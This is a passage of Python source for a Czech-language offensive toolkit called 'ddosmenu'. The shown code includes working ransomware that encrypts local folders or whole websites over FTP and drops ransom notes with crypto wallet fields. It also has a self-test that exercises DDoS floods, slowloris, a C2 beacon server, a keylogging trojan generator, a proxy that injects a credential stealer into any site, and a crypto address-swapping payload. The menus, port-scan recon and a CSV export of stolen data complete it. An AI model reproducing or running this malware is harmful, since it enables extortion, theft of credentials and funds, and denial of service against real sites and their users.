    for i, p in enumerate(files, 1):
        try:
            d = open(p, "rb").read()
            if is_locked(d):
                open(p, "wb").write(unlock_bytes(d, key))
                n += 1
        except Exception as e:
            err("%s: %s" % (p, e))
        if not silent:
            prog(i, len(files), os.path.basename(p)[:28])
    orig = os.path.join(folder, "index.html.orig")
    if os.path.isfile(orig):
        os.replace(orig, os.path.join(folder, "index.html"))
    if not silent:
        ok("%d souboru odemceno" % n)
    return n


def _ftp_conn():
    host = ask("FTP host", "")
    user = ask("FTP uzivatel", "")
    pw = ask("FTP heslo", "")
    ftp = ftplib.FTP()
    ftp.connect(host, 21, timeout=25)
    ftp.login(user, pw)
    ok("prihlasen na " + cya_(host))
    return ftp


def _ftp_walk(ftp, path="/"):
    out = []
    try:
        ftp.cwd(path)
        names = ftp.nlst()
    except Exception:
        return out
    for nm in names:
        if nm in (".", ".."):
            continue
        full = path.rstrip("/") + "/" + nm
        try:
            ftp.cwd(full)
            out += _ftp_walk(ftp, full)
            ftp.cwd(path)
        except Exception:
            out.append(full)
    return out


def wl_lock_ftp():
    ftp = _ftp_conn()
    key = os.urandom(32)
    files = _ftp_walk(ftp, "/")
    n = 0
    for i, p in enumerate(files, 1):
        if p.endswith(("ddosmenu.key", "README_RANSOM.txt", "index.html.orig")):
            continue
        try:
            buf = io.BytesIO()
            ftp.retrbinary("RETR " + p, buf.write)
            d = buf.getvalue()
            if is_locked(d):
                continue
            ftp.storbinary("STOR " + p, io.BytesIO(lock_bytes(d, key)))
            n += 1
        except Exception as e:
            err("%s: %s" % (p, str(e)[:50]))
        prog(i, len(files), os.path.basename(p)[:28])
    ftp.storbinary("STOR /index.html", io.BytesIO(
        ransom_html(n, CONF["price"], CONF["wallet_btc"], CONF["wallet_eth"], key).encode()))
    ftp.storbinary("STOR /README_RANSOM.txt", io.BytesIO(
        ransom_txt(n, 0, key, CONF["wallet_btc"], CONF["wallet_eth"], CONF["price"]).encode()))
    ftp.storbinary("STOR /ddosmenu.key", io.BytesIO(key.hex().encode()))
    ftp.quit()
    print()
    print(box(["  " + kv("souboru", red_(num(n))), "  " + kv("klic", yel_(key.hex()))],
              title="  zamceno pres ftp  "))


def wl_unlock_ftp():
    ftp = _ftp_conn()
    hx = ask("Klic (Enter = stahnout z webu)", "")
    if hx:
        key = bytes.fromhex(hx)
    else:
        buf = io.BytesIO()
        ftp.retrbinary("RETR /ddosmenu.key", buf.write)
        key = bytes.fromhex(buf.getvalue().decode().strip())
    n = 0
    for p in _ftp_walk(ftp, "/"):
        if p.endswith(("ddosmenu.key", "README_RANSOM.txt")):
            continue
        try:
            buf = io.BytesIO()
            ftp.retrbinary("RETR " + p, buf.write)
            d = buf.getvalue()
            if is_locked(d):
                ftp.storbinary("STOR " + p, io.BytesIO(unlock_bytes(d, key)))
                n += 1
        except Exception as e:
            err("%s: %s" % (p, str(e)[:50]))
    ftp.quit()
    ok("%d souboru odemceno" % n)


def cmd_weblocker():
    hr("6 · weblocker · ransomware")
    while True:
        print(box(["  " + grn_("1") + "  zamknout slozku",
                   "  " + grn_("2") + "  odemknout slozku",
                   "  " + grn_("3") + "  zamknout web pres FTP",
                   "  " + grn_("4") + "  odemknout web pres FTP",
                   "  " + red_("0") + "  zpet"]))
        ch = ask("Volba", "1")
        if ch == "0":
            return
        try:
            {"1": wl_lock_folder, "2": wl_unlock_folder,
             "3": wl_lock_ftp, "4": wl_unlock_ftp}.get(ch, lambda: None)()
        except KeyboardInterrupt:
            print()
        pause()


# --------------------------------------------------------------------------- #
#  selftest
# --------------------------------------------------------------------------- #
def cmd_selftest():
    hr("selftest · overuji vsechny moduly")
    info("bezi lokalne, cca 20 s")
    print()
    res = []
    tgt = test_server_start(8111)

    try:
        with spinning("test 1/7  ddos flood"):
            f = Flooder(tgt, threads=80, timeout=3, quiet=True)
            r = f.run(duration=3)
        res.append(("ddos flood", r["tot"] > 50 and r["ok"] > 0,
                    "%s req / %s ok" % (num(r["tot"]), num(r["ok"]))))
    except Exception as e:
        res.append(("ddos flood", False, str(e)[:40]))

    try:
        with spinning("test 2/7  dos slowloris"):
            socks = []
            for _ in range(60):
                s = socket.create_connection(("127.0.0.1", 8111), 5)
                s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\n")
                socks.append(s)
            time.sleep(1.2)
            alive = 0
            for s in socks:
                try:
                    s.sendall(b"X-a: 1\r\n")
                    alive += 1
                except Exception:
                    pass
            for s in socks:
                s.close()
        res.append(("dos slowloris", alive >= 50, "%d/60 spojeni drzi" % alive))
    except Exception as e:
        res.append(("dos slowloris", False, str(e)[:40]))

    try:
        with spinning("test 3/7  c2 server"):
            before = STATS["total"]
            c2_start(quiet=True)
            req = urllib.request.Request(c2_base() + "/beacon",
                                         data=json.dumps({"type": "SELFTEST", "tag": "t"}).encode(),
                                         headers={"Content-Type": "text/plain"})
            urllib.request.urlopen(req, timeout=5, context=_UCTX).read()
            time.sleep(0.3)
            res.append(("c2 server", STATS["total"] > before, "prijal beacon"))
    except Exception as e:
        res.append(("c2 server", False, str(e)[:40]))

    try:
        with spinning("test 4/7  generator trojana"):
            p = write_art("_selftest_trojan.js", _gen(TROJAN_JS, "selftest"))
            txt = open(p, encoding="utf-8").read()
            res.append(("trojan payload", ("sendBeacon" in txt) and (c2_base() in txt),
                        "%d B" % len(txt)))
    except Exception as e:
        res.append(("trojan payload", False, str(e)[:40]))

    try:
        with spinning("test 5/7  injection proxy"):
            c2_start(quiet=True)
            proxy_start(9111)
            time.sleep(0.3)
            body = urllib.request.urlopen("http://127.0.0.1:9111/http/127.0.0.1:8111/",
                                          timeout=8).read().decode("utf-8", "replace")
            res.append(("injection proxy", "inject.js" in body, "skript vlozen"))
        proxy_stop()
    except Exception as e:
        res.append(("injection proxy", False, str(e)[:40]))

    try:
        with spinning("test 6/7  weblocker sifra"):
            d = os.path.join(ART, "_selftest_lock")
            os.makedirs(d, exist_ok=True)
            open(os.path.join(d, "a.txt"), "w").write("tajemstvi" * 200)
            open(os.path.join(d, "index.html"), "w").write("<h1>web</h1>")
            wl_lock_folder(d, silent=True)
            enc = open(os.path.join(d, "a.txt"), "rb").read()
            locked = is_locked(enc) and b"tajemstvi" not in enc
            wl_unlock_folder(d, silent=True)
            dec = open(os.path.join(d, "a.txt")).read()
            res.append(("weblocker sifra", locked and dec.startswith("tajemstvi"),
                        "zasek + odemceni OK"))
    except Exception as e:
        res.append(("weblocker sifra", False, str(e)[:40]))

    try:
        with spinning("test 7/7  crypto swap"):
            p = write_art("_selftest_crypto.js", _gen(CRYPTO_JS, "selftest", {
                "__WALLET_BTC__": "bc1qTEST", "__WALLET_ETH__": "0xTEST",
                "__WALLET_LTC__": "LTEST", "__SWAP__": "true"}))
            txt = open(p, encoding="utf-8").read()
            res.append(("crypto payload", "bc1qTEST" in txt and "__WALLET" not in txt,
                        "%d B" % len(txt)))
    except Exception as e:
        res.append(("crypto payload", False, str(e)[:40]))

    test_server_stop()
    print()
    lines = []
    passed = 0
    for name, good, note in res:
        lines.append("  " + (grn_("[ PASS ]") if good else red_("[ FAIL ]")) +
                     "  " + name.ljust(20) + dim_(note))
        if good:
            passed += 1
    print(box(lines, title="  selftest  %d/%d  " % (passed, len(res)), double=True))
    print()
    if passed == len(res):
        print("  " + b_(grn_(">>> vse funguje. toolkit je ready. <<<")))
    else:
        warn("neco selhalo - posli mi ty FAIL radky")


# --------------------------------------------------------------------------- #
#  data / recon / settings / help
# --------------------------------------------------------------------------- #
def cmd_data():
    hr("data · co nam chytilo")
    rows = load_beacons()
    info("zaznamu celkem: " + b_(str(len(rows))))
    if not rows:
        return warn("zatim nic - spust trojana (3) nebo proxy (4)")
    lines = []
    for r in rows[-12:]:
        d = r.get("data") or {}
        t = d.get("type", "?") if isinstance(d, dict) else "?"
        u = str(d.get("url", ""))[:32] if isinstance(d, dict) else ""
        lines.append("  " + dim_(r.get("ts", "")[-8:]) + "  " + yel_(t.ljust(12)) + "  " +
                     dim_(r.get("ip", "").ljust(15)) + "  " + u)
    print(box(lines, title="  poslednich 12  "))
    if ask_yes("exportovat vse do CSV?", True):
        p = os.path.join(ART, "export_%s.csv" % datetime.now().strftime("%Y%m%d_%H%M%S"))
        with open(p, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["ts", "ip", "type", "tag", "url", "data"])
            for r in rows:
                d = r.get("data") or {}
                w.writerow([r.get("ts"), r.get("ip"), d.get("type", ""), d.get("tag", ""),
                            d.get("url", ""), json.dumps(d, ensure_ascii=False)])
        ok("export: " + cya_(p))


def cmd_recon():
    hr("recon")
    target = ask("Host nebo URL", "")
    if not target:
        return
    host = urllib.parse.urlparse(target).hostname if "://" in target else target.split("/")[0]
    act("DNS lookup " + cya_(host))
    try:
        seen = set()
        for fam, _, _, _, sa in socket.getaddrinfo(host, None):
            if sa[0] not in seen:
                seen.add(sa[0])
                info("%s -> %s" % ("IPv6" if fam == socket.AF_INET6 else "IPv4", sa[0]))
    except Exception as e:
        err("DNS: %s" % e)
    act("HTTP hlavicky")
    try:
        r = http_get(target if "://" in target else "http://" + target, timeout=10)
        info("status: " + str(r.status))
        for k in ("Server", "X-Powered-By", "Content-Type", "Location", "Via", "CF-RAY"):
            if r.headers.get(k):
                info("%s: %s" % (k, r.headers.get(k)))
    except urllib.error.HTTPError as e:
        info("status: HTTP %d" % e.code)
    except Exception as e:
        err("http: %s" % e)
    act("port scan")
    ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 587, 993, 995, 1433, 1521,
             2082, 2083, 3000, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 8888, 9000, 27017]
    found = []

    def scan(p):
        s = socket.socket()
        s.settimeout(1.2)
        if s.connect_ex((host, p)) == 0:
            found.append(p)
        s.close()

    ths = [threading.Thread(target=scan, args=(p,), daemon=True) for p in ports]
    for t in ths:
        t.start()
    for t in ths:
        t.join(timeout=3)
    if found:
        for p in sorted(found):
            ok("port " + b_(str(p)) + dim_(" otevren"))
    else:
        warn("zadny bezny port otevreny")


def cmd_settings():
    hr("nastaveni")
    info(dim_("Enter = nechat puvodni"))
    CONF["c2_host"] = ask("verejna IP/domena C2", CONF["c2_host"])
    CONF["c2_port"] = ask_int("port C2", int(CONF["c2_port"]))
    CONF["proxy_port"] = ask_int("port proxy", int(CONF["proxy_port"]))
    CONF["wallet_btc"] = ask("BTC adresa", CONF["wallet_btc"])
    CONF["wallet_eth"] = ask("ETH adresa", CONF["wallet_eth"])
    CONF["wallet_ltc"] = ask("LTC adresa", CONF["wallet_ltc"])
    CONF["price"] = ask("cena vykupu", CONF["price"])
    CONF["tag"] = ask("default tag", CONF["tag"])
    CONF["theme"] = ask("tema (green/cyan/amber/magenta/mono)", CONF.get("theme", "green"))
    CONF["beep"] = ask_yes("pipnuti pri beaconu", bool(CONF.get("beep", True)))
    apply_theme(CONF["theme"])
    save_conf(CONF)
    print()
    if ask_yes("vygenerovat self-signed cert pro HTTPS?", False):
        gen_cert()
    ok("ulozeno")


def cmd_help():
    hr("navod")
    print(box([
        "  " + b_("spusteni") + "   python ddosmenu.py",
        "  " + b_("selftest") + "   [s]  overi, ze vse funguje",
        "",
        "  " + grn_("1") + " ddos         " + dim_("real flood, 'down' rezim"),
        "  " + grn_("2") + " dos          " + dim_("slowloris / RUDY / slow-read"),
        "  " + grn_("3") + " trojan       " + dim_("otisk + keylog + hesla + tokeny"),
        "  " + grn_("4") + " injectweb    " + dim_("stealer + PROXY na vsechny weby"),
        "  " + grn_("5") + " cryptotrojan " + dim_("swap adres + lov penez"),
        "  " + grn_("6") + " weblocker    " + dim_("ransomware (slozka / FTP)"),
        "  " + grn_("7") + " c2           " + dim_("sber + dashboard /dash"),
        "  " + grn_("8") + " recon        " + dim_("DNS, hlavicky, port scan"),
        "  " + grn_("9") + " settings     " + dim_("ip, porty, adresy, tema"),
        "",
        "  " + b_("trojana na jakykoliv web:") + " [4] -> 2 (proxy)",
        "  " + b_("bez internetu:") + " v DDoS nech URL prazdne",
    ], title="  navod  "))


# --------------------------------------------------------------------------- #
#  test server
# --------------------------------------------------------------------------- #
class TinyHandler(BaseHTTPRequestHandler):
    n = 0
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def do_GET(self):
        TinyHandler.n += 1
        body = b"<h1>ddosmenu test target</h1>"
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_POST = do_GET


TINY = {"srv": None}


def test_server_start(port=8000):
    if TINY["srv"]:
        return "http://127.0.0.1:%d" % port
    srv = _Srv(("127.0.0.1", port), TinyHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    TINY["srv"] = srv
    return "http://127.0.0.1:%d" % port


def test_server_stop():
    if TINY["srv"]:
        TINY["srv"].shutdown()
        TINY["srv"].server_close()
        TINY["srv"] = None


# --------------------------------------------------------------------------- #
#  menu + main
# --------------------------------------------------------------------------- #
def dot(on):
    return (grn_("● online") if UNICODE else grn_("[on]")) if on else \
           (dim_("○ off") if UNICODE else dim_("[off]"))


def menu():
    L = [
        "  " + dgr_("UTOK"),
        "   " + b_(grn_("1")) + "  ddos          " + dim_("real flood · GET/POST/HEAD · multiproces"),
        "   " + b_(grn_("2")) + "  dos           " + dim_("slowloris · RUDY · slow-read · hammer"),
        "  " + dgr_("NASADENI"),
        "   " + b_(grn_("3")) + "  trojan        " + dim_("fingerprint + keylogger -> C2"),
        "   " + b_(grn_("4")) + "  injectweb     " + dim_("loginy + fotky + ") + yel_("PROXY"),
        "   " + b_(grn_("5")) + "  cryptotrojan  " + dim_("swap adres + lov penez"),
        "   " + b_(grn_("6")) + "  weblocker     " + dim_("ransomware na web"),
        "  " + dgr_("NASTROJE"),
        "   " + b_(yel_("7")) + "  c2 server     " + dim_("sber dat + dashboard") + "   " + dot(bool(C2["srv"])),
        "   " + b_(yel_("8")) + "  recon         " + dim_("dns · hlavicky · port scan"),
        "   " + b_(yel_("9")) + "  settings      " + dim_("ip, porty, adresy, tema"),
        "   " + b_(mag_("s")) + "  selftest      " + dim_("overi, ze vse funguje"),
        "   " + b_(mag_("d")) + "  data          " + dim_("prehled + export"),
        "   " + b_(mag_("p")) + "  proxy         " + dim_("inject na vsechny weby") + "   " + dot(bool(PROXY["srv"])),
        "   " + b_(yel_("h")) + "  help",
        "   " + b_(red_("0")) + "  exit",
    ]
    print()
    print(box(L, title="  DDOSMENU v%s  ·  elite  " % VERSION, double=True))


CMDS = {"1": cmd_ddos, "2": cmd_dos, "3": cmd_trojan, "4": cmd_injectweb,
        "5": cmd_cryptotrojan, "6": cmd_weblocker, "8": cmd_recon, "9": cmd_settings,
        "h": cmd_help, "s": cmd_selftest, "d": cmd_data}


def watch():
    hr("live watch · Ctrl+C = stop")
    rows = load_beacons()
    seen = len(rows)
    ok("cekam na beacony na " + cya_(c2_base()))
    try:
        while True:
            rows = load_beacons()
            while seen < len(rows):
                r = rows[seen]
                seen += 1
                d = r.get("data") or {}
                t = d.get("type", "?") if isinstance(d, dict) else "?"
                print("  " + dim_(r.get("ts", "")) + " " + yel_("[%s]" % t) + " " +
                      str(d.get("url", ""))[:60])
            time.sleep(1)
    except KeyboardInterrupt:
        print()


def main():
    if "--version" in sys.argv:
        print("ddosmenu v%s" % VERSION)
        return
    print_banner()
    boot(quick=("--fast" in sys.argv))
    print(dim_("  C2: ") + cya_(c2_base()) + dim_("   ·   artefakty: ") + dim_(ART))

    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    if args:
        a = args[0]
        if a in ("--c2", "-c"):
            c2_start()
            info("Ctrl+C = konec")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                return
        if a in ("--proxy", "-p"):
            c2_start()
            proxy_start()
            info("otevri http://127.0.0.1:%d" % CONF["proxy_port"])
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                return
        if a in ("--watch", "-w"):
            c2_start()
            return watch()
        if a in ("--test", "-t"):
            info("test server na " + cya_(test_server_start(8000)))
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                return
        if a in CMDS:
            try:
                CMDS[a]()
            except KeyboardInterrupt:
                print()
            if "--stay" in sys.argv:
                pause()
            else:
                return

    while True:
        menu()
        ch = ask("volba", "").lower()
        if ch == "0":
            c2_stop()
            proxy_stop()
            test_server_stop()
            print()
            print(box(["  " + grn_("connection closed. bye.")]))
            return
        if ch == "7":
            if C2["srv"]:
                c2_stop()
                warn("C2 zastaven")
            else:
                c2_start()
            continue
        if ch == "p":
            if PROXY["srv"]:
                proxy_stop()
                warn("proxy zastavena")
            else:
                c2_start()
                proxy_start()
            continue
        fn = CMDS.get(ch)
        if fn:
            print()
            try:
                fn()
            except KeyboardInterrupt:
                print()
                warn("preruseno")
            except Exception as e:
                err("chyba: %s" % e)
            pause()
        else:
            err("neznama volba")


if __name__ == "__main__":
    mp.freeze_support()
    main()